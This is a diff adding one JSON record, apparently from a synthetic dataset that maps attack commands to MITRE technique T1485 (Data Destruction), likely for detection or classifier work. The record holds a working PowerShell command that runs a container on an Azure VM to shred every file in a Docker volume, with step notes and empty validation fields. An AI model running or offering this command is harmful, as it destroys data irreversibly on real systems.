@@ -1,0 +1,21 @@
+{
+  "technique_id": "T1485",
+  "platform": "IaaS",
+  "shell": "PowerShell",
+  "command": "Invoke-AzVMRunCommand -ResourceGroupName 'RG-Apps' -Name 'LinVM-Containers' -CommandId 'RunShellScript' -ScriptString \"docker run --rm -v projectdata:/data alpine sh -lc 'find /data -type f -print0 | xargs -0 -I{} shred -n 3 -z -u \\\"{}\\\"'\"",
+  "explanation": "For a Docker volume named projectdata on a Linux VM, runs a container to securely overwrite and delete all files within the volume.",
+  "rationale_steps": [
+    "Mount the specific Docker volume into a temporary container.",
+    "Shred all files in the mounted path to irreversibly destroy data without affecting other volumes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1485-28d85ee8-6e3aa0c6",
+  "source_prompt_hash": "28d85ee8",
+  "timestamp_utc": "2025-09-30T08:03:27.709996Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
